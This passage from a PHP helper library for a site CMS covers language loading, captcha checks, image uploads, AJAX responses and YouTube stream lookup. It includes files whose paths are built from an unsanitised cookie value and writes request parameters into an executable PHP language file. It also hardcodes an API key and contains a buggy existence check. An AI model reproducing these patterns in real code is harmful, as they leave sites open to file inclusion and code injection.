function loadLanguage($lang, $part, $l = null)
{
     global $g;
    // some languages have $g values in phrases so requires global variable
#var_dump();

    $file = Common::getOption('dir_lang', 'path') . $part . '/' . $lang . '/language.php';
    if(file_exists($file))
        include ($file);

    return $l;
}

function loadLanguageAdmin($l = null)
{
    global $g;
    // some languages have $g values in phrases so requires global variable

    $l =  loadLanguage('default', 'main', $l);

    $mainLanguage = Config::getOption('lang', 'main');

    if($mainLanguage != 'default') {
        $l = loadLanguage($mainLanguage, 'main', $l);
    }

    $langAdminLoaded = Common::getOption('lang_loaded', 'main');
    $l = loadLanguage($langAdminLoaded, 'main', $l);

    return $l;
}

function loadLanguageAdminMobile()
{
    $l = null;

    $l =  loadLanguage('default', 'mobile');
    $langValueMobile = Common::getOption('mobile', 'lang_value');
    if ($langValueMobile != 'default') {
        $l = loadLanguage($langValueMobile, 'mobile', $l);
    }
    $langAdmin = Config::getOption('lang','administration');
    if(get_cookie('set_language_administration')) {
        $l = loadLanguage(get_cookie('set_language_administration'), 'mobile', $l);
    } elseif ($langAdmin != 'default' && $langAdmin != $langValueMobile) {
        $l = loadLanguage($langAdmin, 'mobile', $l);
    }
    return $l;
}

function loadLanguageSite($userLang)
{
    global $g;

    $l = null;
    $l = loadLanguage('default', 'main');
    $currentLang = Common::getOption('main','lang_value');
    if($currentLang != 'default')
        $l = loadLanguage($currentLang, 'main', $l);

    $l = loadLanguage($userLang, 'main', $l);
    return $l;
}

function loadLanguageSiteMobile($language)
{
    $l = null;
    $l = loadLanguage('default', 'main');
    $l = loadLanguage('default', 'mobile', $l);
    if($language != 'default') {
        $l = loadLanguage($language, 'main', $l);
        $l = loadLanguage($language, 'mobile', $l);
    }

    return $l;
}

function countFrameworks($tmpl){
    global $g;
    if(empty($g['path']['dir_tmpl'])) {
        $g['path']['dir_tmpl'] = '../_frameworks';
    }
    if(!file_exists($g['path']['dir_tmpl'].'/'.$tmpl)) {
        return false;
    }
    $path =  scandir($g['path']['dir_tmpl'].'/'.$tmpl);
    unset($path[0]);
    unset($path[1]);
    foreach($path as $item) {
        if(is_dir($g['path']['dir_tmpl'].'/'.$tmpl.'/'.$item)) {
            return true;
        }
    }
    return false;
}


function check_captcha($value,$msg="",$skip=false,$js = true)
{
    if ( isset($_SESSION['securimage_code_value']) && !empty($_SESSION['securimage_code_value']) ) {
      if ( $_SESSION['securimage_code_value'] == strtolower(trim($value)) ) {
        $correct_code = true;
		set_session("j_captcha", true);
        session_start();
        $_SESSION['securimage_code_value'] = '';
        session_write_close();
      } else {
        $correct_code = false;
      }
    } else {
        $correct_code = false;
    }
    if ($js == true) {
// ERROR MESSAGE
        $js = "alert(\"$msg\")";

// CORRECT VALUE
        if ($correct_code)
            $js = "show_load_animation(); document.UploadPhotoForm.submit();";

// CORRECT VALUE AND WITHOUT PHOTO
        if ($correct_code && $skip)
            $js = "location.href='join3.php?cmd=skip';";

        $objResponse = new xajaxResponse();
        $objResponse->addScript($js);
        return $objResponse;
    }
    else {
        return $correct_code;
    }
}

function check_captcha_mod($value, $msg='', $skip=false, $js = true, $submitForm = '', $path = '../')
{
    $correct_code = true;
    $reloadCaptcha = '';
    if (Common::isOptionActive('recaptcha_enabled')) {
        require_once($path . '_server/securimage/initRecaptcha.php');
        $secretKey = Common::getOption('recaptcha_secret_key');
        $recaptcha = new \ReCaptcha\ReCaptcha($secretKey);
        $resp = $recaptcha->verify($value, $_SERVER['REMOTE_ADDR']);
        if (!$resp->isSuccess()){
            $correct_code = false;
            $reloadCaptcha = "grecaptcha.reset(recaptchaWd);";
        } else {
            set_session("j_captcha", true);
        }
    } else {
        if (!Securimage::check($value)) {
            $correct_code = false;
            $reloadCaptcha = "$('#captcha_reload').click();$('#captcha_input').val('').focus();";
        } else {
            set_session("j_captcha", true);
        }
    }
    // always work ajax -> $js = string()
    // always work ajax -> $skip = string()
    $js = (bool)$js;
    $skip = (bool)$skip;
    if ($js == true) {
        // ERROR MESSAGE
        $js = $reloadCaptcha . "alert(\"$msg\");";

        // CORRECT VALUE
        if ($correct_code) {
            if ($submitForm == '') {
                $submitForm = 'UploadPhotoForm';
            }
            $js = "show_load_animation(); document.{$submitForm}.submit();";
        }

        // CORRECT VALUE AND WITHOUT PHOTO
        if ($correct_code && $skip)
            $js = "parent.location.href='join3.php?cmd=skip';";

        $objResponse = new xajaxResponse();
        $objResponse->addScript($js);
        return $objResponse;
    } else {
        return $correct_code;
    }
}

function mb_ucfirst($str, $encoding = 'UTF-8')
{
    $str = mb_ereg_replace('^[\ ]+', '', $str);
    $str = mb_strtoupper(pl_substr($str, 0, 1, $encoding), $encoding).
           pl_substr($str, 1, pl_strlen($str), $encoding);
    return $str;
}

function mb_ucwords($str, $encoding = 'UTF-8')
{
    $result = '';
    $parts = explode(' ', mb_strtolower($str, $encoding));
    for ($i = 0; $i <= count($parts) - 1; $i++) {
       $parts[$i] = mb_ucfirst($parts[$i], $encoding);
    }

    return implode(' ', $parts);
}

//Add next value in mail chains subject (Re:, Re[2]:, Re[3]:, etc)
function mail_chain($subject, $type = 'Re')
{
    $subject = trim($subject);
    $subjectSrc = $subject;
    $firstChainItem = "$type:";

    $pos = strpos($subject, $type);

    if($pos === 0) {
        if(strpos($subject, $firstChainItem) === 0) {
            $subject = $type . '[2]: ' . substr($subject, strlen($firstChainItem));
        } elseif (preg_match('/^' . $type . '\[(\d*)\]:/', $subject, $match)) {
            $subject = substr_replace($subject, $type . '[' . ($match[1] + 1) . ']', 0, strlen("{$type}[{$match[1]}]"));
        }
    }

    if($subjectSrc === $subject) {
        $subject = $firstChainItem . ' ' . $subject;
    }

    return $subject;


    // old version
    $pos = strpos($subject, $type);
    if ($pos === FALSE || $pos > 0) {
        return $type.': ' . $subject;
    } else {
        return preg_match('/'.$type.'\[(\d*)\]:/', $subject, $match) ? str_replace("{$type}[{$match[1]}]: ", $type.'[' . ($match[1] + 1) . ']: ', $subject) : $type.'[2]:'. substr($subject, 3);
    }
}

function mb_to_bytes($mb)
{
    return intval($mb)*1048576;
}

function sanitize_upload_name_all($file_name)
{
    return str_replace(array('/', '\\', '.'), array('', '', ''), $file_name);
}

function readAllFileArrayOfDir($dir, $prf = 'Background', $sort = SORT_NUMERIC, $template = '', $uploadedByYou = '', $extension = 'jpg')
{
    $files = array();
    if ($uploadedByYou != '') {
        $uploadedByYou = ' '. $uploadedByYou;
    }
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            while (($file = readdir($dh)) !== false) {
                if ($file != '.' && $file != '..') {
                    if ($template != '') {
                        if (strpos($file, $template) !== false && !strpos($file, 'src')) {
                            $name = explode('_', $file);
                            $name = explode('.', $name[count($name)-1]);
                            if ($name[0] == 'None'){
                                $files[$name[0] . ".{$extension}"] = $name[0] . $uploadedByYou;
                            } else {
                                $files[$name[0] . ".{$extension}"] = $prf . ' ' . $name[0] . $uploadedByYou;
                            }
                        }
                    } else {
                        $name = explode('.', $file);
                        if ($name[0] == 'None'){
                            $files[$file] = $name[0] . $uploadedByYou;
                        } else {
                            $files[$file] = $prf . ' ' . $name[0] . $uploadedByYou;
                        }
                    }
                }
            }
            closedir($dh);
        }
    }
    if (!empty($sort)) {
        ksort($files, $sort);
    }

    return $files;
}

function getNumUploadFile($files, $i)
{
    foreach ($files as $value) {
        if ($i != $value) {
            break;
        }
        $i++;
    }
    return $i;
}

function validUploadFileImage($upload, $errorSize, $width, $height)
{
    $error = '';

	$fileImageData = Common::uploadDataImageFromSetData(null, $upload);
    if (isset($_FILES[$upload])) {
        $uploadError = $_FILES[$upload]['error'];
        if ($uploadError == 0) {
            $tmpFile = $_FILES[$upload]['tmp_name'];
            if (Image::isValid($tmpFile)) {
                $imgSz = @custom_getimagesize($tmpFile);
                if ($imgSz[0] < $width || $imgSz[1] < $height) {
                    $error = $errorSize;
                }
            } else {
                $error = 8;
            }

        } else {
            $error = $uploadError;
        }
    } else {
        $error = 4;
    }

	if ($error && $fileImageData) {
		@unlink($fileImageData);
	}

    return $error;
}

function uploadFileImagesCropped($upload, $errorSize, $width, $height, $file, $delete = true, $dir = 'tmpl', $isResizeW = false)
{
    global $g;


	$fileImageData = Common::uploadDataImageFromSetData(null, $upload . '_data');

    $error = validUploadFileImage($upload, $errorSize, $width, $height);

    if ($error == '') {
        $im = new Image();
        if ($im->loadImage($_FILES[$upload]['tmp_name'])) {

            if ($isResizeW) {
                $im->resizeW($width);
            } else {
                $im->cropped($width, $height);
            }
            $prepareFile = explode('.', $file);
            $patch = Common::getOption('url_files', 'path') . $dir . '/';
            $file = $patch . $file;
            $fileSrc = $patch . $prepareFile[0] . '_src.' . $prepareFile[1];

            Common::saveFileSize(array($file, $fileSrc), false);
            if (custom_file_exists($file) && $delete) {
                unlink($file);
            }
            if (custom_file_exists($fileSrc) && $delete) {
                unlink($fileSrc);
            }
            $im->saveImage($file, $g['image']['quality_orig']);
            $im->loadImage($_FILES[$upload]['tmp_name']);
            $im->saveImage($fileSrc, $g['image']['quality_orig']);
            Common::saveFileSize(array($file, $fileSrc));
            unset($im);

			if ($fileImageData) {
				@unlink($fileImageData);
			}
        }
    }

    return $error;
 }

function getParamsFile($dirFile, $addPrfFile, $setOptions, $compresion = '', $extension = 'jpg', $sitePart = 'main', $module = 'options')
{
    global $g;

    $dir = Common::getOption('url_files', 'path') . 'tmpl';
    $part = Common::getOption($sitePart, 'tmpl');
    $dirTmpl = Common::getOption('dir_tmpl_' . $sitePart, 'tmpl') . 'images/' . $dirFile;

    $files = readAllFileArrayOfDir($dirTmpl, '');
    $bgCount = count($files);
    $templateFile =  "{$part}{$addPrfFile}";
    $files = readAllFileArrayOfDir($dir, '', SORT_NUMERIC, $templateFile);
    $i = getNumUploadFile($files, $bgCount + 1);
    $name = "{$i}.{$extension}";
    $nameSrc = "{$i}_src.{$extension}";
    $dirSave = $dir . '/' . $templateFile;
    $file = "{$dirSave}{$name}";
    $fileSrc = "{$dirSave}{$nameSrc}";
    $nameBody = "{$templateFile}{$i}";

    $ratio = Common::getOption($compresion, $module);
    if (empty($ratio)) {
        $ratio = $g['image']['quality'];
    }

    return array('name' => $name, 'file' => $file, 'fileSrc' => $fileSrc, 'ratio' => $ratio, 'name_body' => $nameBody);
 }

 function getFileUrl($dirFile, $file, $addPrfFile, $setOptions, $setOptionsDefault, $sitePart = 'main', $module = 'options')
 {
    global $g;

    $urlTmpl = $g['tmpl']['url_tmpl_' . $sitePart] . "images/{$dirFile}/";
    $path = "{$urlTmpl}{$file}";

    if (file_exists($path) && !empty($file)) {
        $src = $path;
    } else {
        $urlFiles = $g['path']['url_files'] . 'tmpl/';
        $fileUser = basename($g['tmpl']['url_tmpl_' . $sitePart]) . "{$addPrfFile}{$file}";
        $path = "{$urlFiles}{$fileUser}";
        if (file_exists($path)) {
            $src = $path;
        } else {
            $fileDefault = Common::getOption($setOptionsDefault, 'template_options');
            $src = "{$urlTmpl}{$fileDefault}";
            Config::update($module, $setOptions, $fileDefault);
        }
    }

    return $src;
 }

 function isUsersFileExists($dirs, $file)
 {
    $dir = Common::getOption('url_files', 'path') . $dirs;
    $lang = Common::getOption('lang_loaded', 'main');
    $lang = ($lang == 'default') ? '' : '_' . $lang;
    $param = explode('.', $file);
    $fileLang = $param[0] . $lang . '.' . $param[1];

    if (custom_file_exists($dir . '/' . $file) || ($dir . '/' . $fileLang)) {
        return true;
    };
    return false;
 }

 function saveConvertImage($input, $type, $addPrfFile, $setOptions, $compresion = '', $extension = 'png')
 {
    $fileParams = getParamsFile($type, $addPrfFile, $setOptions, $compresion, $extension);

    $image = new uploadImage($_FILES[$input]['tmp_name']);
    $image->image_convert = $extension;
    $image->file_new_name_body = $fileParams['name_body'];
    $image->file_new_name_ext = $extension;

    $error = '';
    if (!$image->uploaded) {
        $error = $image->error;
    }
    $image->Process(Common::getOption('url_files', 'path') . 'tmpl');
    if (!$image->processed) {
        $error .=  '\r\n' . $image->error;
    }
    unset($image);
    if ($error == '') {
        Common::saveFileSize($fileParams['file']);
    }

	if (get_param_int('image_upload_data')) {
		@unlink($_FILES[$input]['tmp_name']);
	}
    return array('error' => '', 'file_name' => $fileParams['name']);
 }

 function getParsePageAjax($page)
 {
	global $g;

	$page->init();
	$page->action();
	$tmp = null;

	return $page->parse($tmp, true);
 }

 function loadPageContentAjax($page)
 {
    global $p;
    if (get_param('upload_page_content_ajax')) {
        $page->init();
        $page->action();
        $page->parseSEO();
        $cacheLoadPages = get_param_array('cache_upload_pages_ajax');
        if (!isset($cacheLoadPages[$p])) {
            $page->parseScriptInit();
        }
        $tmp = null;
        echo getResponseDataAjax($page->parse($tmp, true));
        exit;
    } else {
        $page->parseScriptInit();
    }
 }

 function loadPageContentAjaxSign($page, $pending)
 {
    global $p;
    if (get_param('upload_page_content_ajax')) {
        $page->init();
        $page->action();
        $page->parseSEO();
        $cacheLoadPages = get_param_array('cache_upload_pages_ajax');
        if (!isset($cacheLoadPages[$p])) {
            $page->parseScriptInit();
        }
        $tmp = null;
        echo getResponseDataAjaxSign($page->parse($tmp, true), $pending);
        exit;
    } else {
        $page->parseScriptInit();
    }
 }

 function getResponseAjaxByAuth($isAuth, $data = true)
 {
    $response['status'] = 1;

    if ($data === 'error') {
        $data = false;
    }

    $response['data'] = ($isAuth) ? $data : 'please_login';

    return defined('JSON_UNESCAPED_UNICODE') ? json_encode($response, JSON_UNESCAPED_UNICODE) : json_encode($response);
 }


 function getResponsePageAjaxByAuth($isAuth, &$page)
 {
    $return = '';
    if ($isAuth && $page !== false) {
        $page->init();
        $page->action();
        $tmp = null;
        $return = $page->parse($tmp, true);
    }
    return getResponseAjaxByAuth($isAuth, $return);
 }


 function getResponseDataAjaxByAuth($data = true)
 {
    $response['status'] = 1;
    if ($data === 'error') {
        $data = false;
    }
    $response['data'] = guid() ? $data : 'please_login';

    return json_encode($response);
 }

 function getResponseDeleteDataAjaxByAuth($data = true) {
    $response['status'] = 1;
    if ($data === 'error') {
        $data = false;
    }
    $response['data'] = $data ? $data : 'please_login';

    return json_encode($response);
 }

 function getResponseDataAjax($data = true)
 {
    $response['status'] = 1;
    if ($data === 'error') {
        $data = false;
    }
    $response['data'] = $data;

    return defined('JSON_UNESCAPED_UNICODE') ? json_encode($response, JSON_UNESCAPED_UNICODE) : json_encode($response);
 }

 function getResponseDataAjaxSign($data = true, $pending = true) 
 {
    $response['status'] = 1;
    $response['pending'] = $pending;
    if ($data === 'error') {
        $data = false;
    }
    $response['data'] = $data;

    return defined('JSON_UNESCAPED_UNICODE') ? json_encode($response, JSON_UNESCAPED_UNICODE) : json_encode($response);
 }

 function getResponsePageAjaxAuth(&$page)
 {
    $return = '';
    $isAuth = guid() ? true : false;
    if ($isAuth && $page !== false) {
        $page->init();
        $page->action();
        $tmp = null;
        $return = $page->parse($tmp, true);
        $return = trim($return);
    }
    return getResponseDataAjaxByAuth($return);
 }

 function get_json_encode($data, $status = 1)
 {
    $response['status'] = $status;
    $response['page'] = $data;

    return json_encode($response);
 }

 function shuffle_assoc($array)
 {
    $keys = array_keys($array);
    shuffle($keys);
    $result = array();
    foreach ($keys as $key){
        $result[$key] = $array[$key];
    }
    return $result;
 }

 function lAjax($msg, $prf = '#js:error:')
 {
     //$msg = str_replace('<br>', '\r\n', $msg);
     return (get_param('ajax')) ? $prf . l($msg) : l($msg);
 }

 function getMsgAjax($msg, $prf = '#js:error:', $br = '<br>')
 {
     return (get_param('ajax')) ? "{$prf}{$msg}" : "{$msg}{$br}";
 }

 function redirectAjax($to = '')
 {
    $ajax = get_param('ajax');
    if (!$ajax) {
        redirect($to);
    }
 }

 function htmlToJs($html) {
	return str_replace(array("\\","'","\n","\r"), array("\\\\","\\'","\\\n",""), trim($html));
 }

 function toJs($value){
    $value = addslashes(he_decode($value));
    $value = str_replace(array("\r\n", "\n"), '\n', $value);
    return $value;
 }

 function toAttr($value){
    $value = he_decode($value);
    return he($value);
 }

 function checkByAuth()
 {
    global $g;

    if (!guid()) {
        if (get_param('ajax')) {
            die(getResponseDataAjaxByAuth());
        } else {
            redirect($g['path']['url_main'] . Common::pageUrl('login'));
        }
    }
 }

 function ratingFloatToStrTwoDecimalPoint($value)
 {
    $s = strval($value);
    if (strpos($s, '.') === false) {
        $s .= '.';
    }
    $s .= '00';
    return mb_substr($s, 0, 4, 'UTF-8');
 }

function getImageBright($path, $imageGranularity = 10){

    $imageGranularity = max(1, abs((int)$imageGranularity));

    $size = @custom_getimagesize($path);
    if($size === false){
        return false;
    }

    switch($size[2]){
	    case 1:
	        if (!($img = imageCreateFromGif($path))) {
	            return false;
	        }
	        break;
	    case 2:
	        if (!($img = imageCreateFromJpeg($path))) {
	            return false;
	        }
	        break;
	    case 3:
	        if (!($img = imageCreateFromPng($path))) {
	            return false;
	        }
	        break;
	    default:
	        return false;
    }
   	if (!$img){
   		return false;
   	}

    $num = 0;
    $colors = 0;
    for($x = 0; $x < $size[0]; $x += $imageGranularity){
      		for($y = 0; $y < $size[1]; $y += $imageGranularity)	{
         		$thisColor = imagecolorat($img, $x, $y);
         		$rgb = imagecolorsforindex($img, $thisColor);
        		$red = round(round(($rgb['red'] / 0x33)) * 0x33);
         		$green = round(round(($rgb['green'] / 0x33)) * 0x33);
         		$blue = round(round(($rgb['blue'] / 0x33)) * 0x33);
         		$colors += ((0.3*$red) + (0.59*$green) + (0.11*$blue))/255;
                //$colors[] = ($red * 0.8 + $green + $blue * 0.2) / 510 * 100;
                $num++;
      		}
    }

    return round($colors/$num,2);
}

function changeLinkColorOfBackgroundBright($path, $imageGranularity = 10){
    $bright = floatval(getImageBright($path, $imageGranularity));
    return $bright > .6;
}

function hex2rgb($hex){
   $hex = trim(str_replace("#", "", $hex));

   if(!preg_match('/^([0-9a-fA-F]{3}){1,2}$/', $hex)) {
       $hex = 'FFF';
   }

   if(mb_strlen($hex, 'UTF-8') == 3) {
      $r = hexdec(substr($hex,0,1).substr($hex,0,1));
      $g = hexdec(substr($hex,1,1).substr($hex,1,1));
      $b = hexdec(substr($hex,2,1).substr($hex,2,1));
   } else {
      $r = hexdec(substr($hex,0,2));
      $g = hexdec(substr($hex,2,2));
      $b = hexdec(substr($hex,4,2));
   }
   $rgb = array($r, $g, $b);
   return $rgb;
}

/*
 * $color - Hex Color
 */
function isColorBright($color){
    $rgb = hex2rgb($color);
    $bright = ((0.3*$rgb[0]) + (0.59*$rgb[1]) + (0.11*$rgb[2]))/255;
    return $bright > .7;
}


function db_options_ul($sql, $selected = "", $r = 0, $sort = false)
{
    DB::query($sql, $r);
    $list = '';
    $items = array();
    while ($row = DB::fetch_row($r)){
        $items[$row[0]] = l($row[1]);
        $class = ($row[0] == $selected) ? 'class="selected"' : '';
        $list .= '<li id="' . $row[0] . '" ' . $class . '><span>' . l($row[1]) . '</span></li>';
    }

    if($sort) {
        $items = Common::sortArrayByLocale($items);
        $list = '';
        foreach($items as $key => $value) {
            $class = ($key == $selected) ? 'class="selected"' : '';
            $list .= '<li id="' . $key . '" ' . $class . '><span>' . $value . '</span></li>';
        }
    }

    return $list;
}

function db_options($sql, $selected = '', $r = 0, $sort = false, $isFirstValueEmpty = false, $name = '')
{
    $ret = '';

    $rows = DB::rows($sql, $r, true);
    DB::free_result($r);

    $count = count($rows);

    if($count) {

        if($sort) {
            $items = array();
            foreach($rows as $row) {
                $items[$row[0]] = l($row[1]);
            }

            $items = Common::sortArrayByLocale($items);

            $rows = array();

            foreach($items as $itemKey => $itemValue) {
                $rows[] = array($itemKey, $itemValue);
            }
        }

        $j = $count;
        $i = 0;

        $id = '';
        if ($isFirstValueEmpty) {
            $lPleaseChoose = Common::getPleaseChoose();
            if ($name) {
                $id = ' id="option_' . $name . '_0" ';
            }
            $ret .= "<option " . $id . " value=\"0\" " . ((!$selected) ? " selected=\"selected\"" : "") . ">" . $lPleaseChoose . "</option>\n";
        }
        foreach ($rows as $row) {
            $i++;
            $selectedCode = '';
            if(($i == 1 && $selected === 'first') || ($i == $count && $selected === 'last_option') || ($selected == $row[0])) {
                $selectedCode = 'selected="selected"';
            }
            if ($name) {
                $id = ' id="option_' . $name . '_' . $row[0] . '" ';
            }
            $ret .= "<option " . $id . " value=\"" . $row[0] . "\" " . $selectedCode . ">" . ($sort ? $row[1] : l($row[1])) . "</option>\n";
        }

    }

    return $ret;

}

function wordsFromTemplate($langWords, $part)
{
    $tmplWords = array();

    $dir = Common::getOption('dir_tmpl_' . $part, 'tmpl');
    $files = Common::dirFiles($dir);

    if(Common::getOption('name', 'template_options') == 'urban') {
        $langSections = array(
            'email_not_confirmed.php',
            'forget_password.php',
            'all',
            'search_results.php',
            'increase_popularity.php',
            'profile_settings.php',
            'index.php',
            'info.php',
            'join.php',
            'upgrade.php',
            'profile_view.php',
            'my_friends.php',
            'user_block_list.php',
            'mutual_attractions.php',
            'users_viewed_me.php',
            'users_rated_me.php',
            'user_block_edit.php',
            );
    }

    if(is_array($files) && count($files)) {

        foreach($files as $file) {

            $fileInfo = pathinfo($file);

            if(strtolower($fileInfo['extension']) != 'html') {
                continue;
            }

            $text = file_get_contents($dir . $file);

            preg_match_all('/\{l\_(\w+)\}/is', $text, $matches);
            if(isset($matches[1]) && count($matches[1])) {
                foreach($matches[1] as $key) {
                    foreach($langWords as $langSection => $langItem) {
                        if(isset($langSections) && !in_array($langSection, $langSections)) {
                            continue;
                        }

                        if(isset($langItem[$key])) {
                            $tmplWords[$langSection][$key] = $langItem[$key];
                        }
                    }
                }
            }

        }
    }

    return $tmplWords;
}

function loadTemplateSettings($sitePart, $template, $field = null)
{
    $dirTmplPath = Common::getOption('dir_tmpl', 'path');
    $tmplSettingsFile = $dirTmplPath . "{$sitePart}/{$template}/settings.php";
    $tmplSet = 'old';
    if(file_exists($tmplSettingsFile)) {
        include $tmplSettingsFile;
        if(isset($g['template_options']['set'])) {
            $tmplSet = $g['template_options']['set'];
        }
    }

    $setSettingsFile = $dirTmplPath . 'common/set_' . $tmplSet . '.php';
    if(isset($g['template_options']) && file_exists($setSettingsFile)) {
        include $setSettingsFile;
        if(isset($g['set_options']) && Common::isValidArray($g['set_options'])) {
            $g['template_options'] = array_merge_recursive($g['set_options'], $g['template_options']);
        }
    }

    $templateOptions = isset($g['template_options']) ? $g['template_options'] : null;
    if ($templateOptions !== null && isset($templateOptions['fields_available'])) {
        if ($templateOptions['fields_not_available'] && isset($templateOptions['fields_not_available'])) {
            $templateOptions['fields_not_available'] = array_diff($templateOptions['fields_not_available'], $templateOptions['fields_available']);
        }
        if ($templateOptions['fields_not_available_admin'] && isset($templateOptions['fields_not_available_admin'])) {
            $templateOptions['fields_not_available_admin'] = array_diff($templateOptions['fields_not_available_admin'], $templateOptions['fields_available']);
        }
    }
    if ($field !== null && $templateOptions !== null) {
        $templateOptions = isset($g['template_options'][$field]) ? $g['template_options'][$field] : null;
    }

    return $templateOptions;
}

function isOptionActiveLoadTemplateSettings($field, $templateOptions = null, $sitePart = '', $template = '')
{
    if ($templateOptions == null) {
        $result = loadTemplateSettings($sitePart, $template, $field);
    } else {
        $result = isset($templateOptions[$field]) ? $templateOptions[$field] : null;
    }
    return $result == 'Y';
}

function getOptionLoadTemplateSettings($field, $templateOptions = null, $sitePart = '', $template = '')
{
    if ($templateOptions == null) {
        $result = loadTemplateSettings($sitePart, $template, $field);
    } else {
        $result = isset($templateOptions[$field]) ? $templateOptions[$field] : null;
    }
    return $result;
}

function getOptionToDefaultLoadTemplateSettings($field, $templateOptions, $default = null)
{
    $result = getOptionLoadTemplateSettings($field, $templateOptions);
    return $result === null ? $default : $result;
}

function getTemplateSettingsType($part, $tmpl){
	$tmplSettings = loadTemplateSettings($part, $tmpl);
	$settingsType = getOptionLoadTemplateSettings('template_edit_settings_type', $tmplSettings, $part, $tmpl);
	if (!$settingsType) {
		$settingsType = getOptionLoadTemplateSettings('name', $tmplSettings, $part, $tmpl);
	}
	return $settingsType;
}

function updateLanguage($lang = 'default', $lang_page = 'all', $part = 'main')
{
    global $g;

    $message = '';

    $langDir = Common::langPath($part, $g['path']['dir_lang']);
    $langPart = $part;

    if ($lang != 'default') {
        $filename = "{$langDir}{$langPart}/default/language.php";
        include($filename);
    }

    $filename = "{$langDir}{$langPart}/{$lang}/language.php";
	include($filename);

	$to = "";
	$to .= "<?php\r\n";
	foreach ($l as $k => $v)
	{
		if ($k == $lang_page) foreach ($v as $k2 => $v2)
        {
			$field_name = ($k2=="submit") ? "submit_js_patch" : $k2;
			$to .= "\$l['" . $k . "']['" . $k2 . "'] = \"" . to_php(get_param($field_name, 0) === 0 ? $v2 : get_param($field_name, "")) . "\";\r\n";
		}
		else foreach ($v as $k2 => $v2) $to .= "\$l['" . $k . "']['" . $k2 . "'] = \"" . to_php($v2) . "\";\r\n";
		$to .= "\r\n";
	}
	$to = substr($to, 0, strlen($to) - 2);
	$to .= "?>";

	#@chmod($g['path']['dir_lang'] . $part . "/". $lang . "/language.php", 0777);

    if (is_writable($filename)) {
        if (!$handle = @fopen($filename, 'w')) {
            $message = "Can't open file ({$filename}).";
        } else {
            if (@fwrite($handle, $to) === FALSE) {
                $message = "Can't write to file({$filename}).";
            } else {
                $message = 'updated';
            }
            @fclose($handle);
        }
    } else {
        $message = "Can't open file ({$filename}).";
    }
}

function getDomainName()
{
    $domainPath = '';
    $uriParts = explode('/', $_SERVER['REQUEST_URI']);

    if(count($uriParts) > 3) {
        array_pop($uriParts);
        array_pop($uriParts);
        $domainPath = implode('/', $uriParts) . '/';
    }
    $domain = str_replace('www.', '', $_SERVER['HTTP_HOST']);

    return $domain . $domainPath;
}

function unset_from_array($needle, &$array, $all = true) {
    if(!$all){
        if(FALSE !== $key = array_search($needle,$array)) unset($array[$key]);
        return;
    }
    foreach(array_keys($array,$needle) as $key){
        unset($array[$key]);
    }
}

function getCodeYouTubeVideoInfo($id) {

	$key = 'AIzaSyAO_FJ2SlqU8Q4STEHLGCilw_Y9_11qcW8';
	$url = 'https://www.youtube.com/youtubei/v1/player?key=' . $key;
	$ctx = '{"context":{
					"client":{
						"hl":"en",
						"clientName":"WEB",
						"clientVersion":"2.20210721.00.00",
						"mainAppWebInfo": {
							"graftUrl": "/watch?v=' . $id . '"
						}
					}
			  }, "videoId": "' . $id . '"}';
	//$ctx = '{"context":{"client":{"hl":"en","clientName":"WEB","clientVersion": "2.20210721.00.00","clientFormFactor":"UNKNOWN_FORM_FACTOR","clientScreen":"WATCH","mainAppWebInfo": {"graftUrl": "/watch?v='.$id.'",}},"user":{"lockedSafetyMode":false    },    "request": {      "useSsl": true,      "internalExperimentFlags": [],      "consistencyTokenJars": []    }  },  "videoId": "'.$id.'",  "playbackContext": {    "contentPlaybackContext": {        "vis": 0,      "splay": false,      "autoCaptionsDefaultOn": false,      "autonavState": "STATE_NONE",      "html5Preference": "HTML5_PREF_WANTS",      "lactMilliseconds": "-1"    }  },  "racyCheckOk": false,  "contentCheckOk": false}';

    $headers = array('Content-Type: application/json');

    $result = urlGetContents($url, 'post', $ctx, 3600, false, $headers);
    return $result;

    /*

	if (extension_loaded('curl')) {
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $ctx);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

		$headers = array();
		$headers[] = 'Content-Type: application/json';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		if (curl_errno($ch)) {
			$result = array();
		}
		curl_close($ch);
	} else {
		$timeout = 3600;
		$options = array(
            'http' => array(
                'timeout' => $timeout,
                ),
			'ssl' => array(
                'verify_peer' => false,
                ),
        );
        $options['http']['method'] = 'POST';
        $options['http']['header'] = 'Content-Type: application/json';
        $options['http']['content'] = $ctx;

        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
	}
    return $result;
     *
     */
}

function checkCodeYouTubeVideoToDownload($urlVideo, $format, $urlencode = false, $links = null, $formats = null) {
    $data = array();
    $errorResponse = array('error_code' => 0, 'reason' => '');
    preg_match('/(?:^|\/|v=)([\w\-]{11,11})(?:\?|&|#|$)/', $urlVideo, $code);
    if (isset($code[1])) {
        $code = $code[1];
        if (IS_DEMO && in_array($code, array('oTXCgR93zC8', 'btHXpOHDY9I'))) {
            $data = array('url' => Common::urlSiteSubfolders() . "_tools/demo_city/{$code}.mp4",
                          'video_hash' => 'site_video',
                          'type' => 'video/mp4; codecs="avc1.64001F, mp4a.40.2"');
            return $data;
        }
        if ($formats === null) {
            $formats = array('mp4' => array(37,22,18), 'webm' => array(45,44,43));
        }
        if ($links === null) {
            $links = getCodeYouTubeVideoInfo($code);
        }

		$info = array();
		if ($links) {
			$info = json_decode($links, true);
		}
        if (!is_array($info) || !isset($info['streamingData'])) {
            return $errorResponse;
        }
		$info = $info['streamingData'];

		if (!isset($info['formats'])) {//adaptiveFormats
			return $errorResponse;
		}
		$info = $info['formats'];

		$videoInfo = array();
        foreach ($info as $video) {
			$videoInfo[$video['itag']] = $video;
		}

		foreach ($formats[$format] as $value) {
			if (isset($videoInfo[$value]) && url_file_exists($videoInfo[$value]['url'])) {
				if (strpos($videoInfo[$value]['mimeType'], $format) !== false) {
					if ($urlencode) {
						$data['url'] = urlencode($videoInfo[$value]['url']);
					} else {
						$data['url'] = $videoInfo[$value]['url'];
					}
					$data['type'] = $videoInfo[$value]['mimeType'];
					break;
				}
			}
		}
		if ($data) {
			$data['video_hash'] = '1';
		}

		//print_r_pre($data);

        if (!$data) {
            if (isset($info['errorcode'])) {
                $errorResponse['error_code'] = $info['errorcode'];
            }
            if (isset($info['reason'])) {
                $errorResponse['reason'] = $info['reason'];
            }
            $data = $errorResponse;
        }
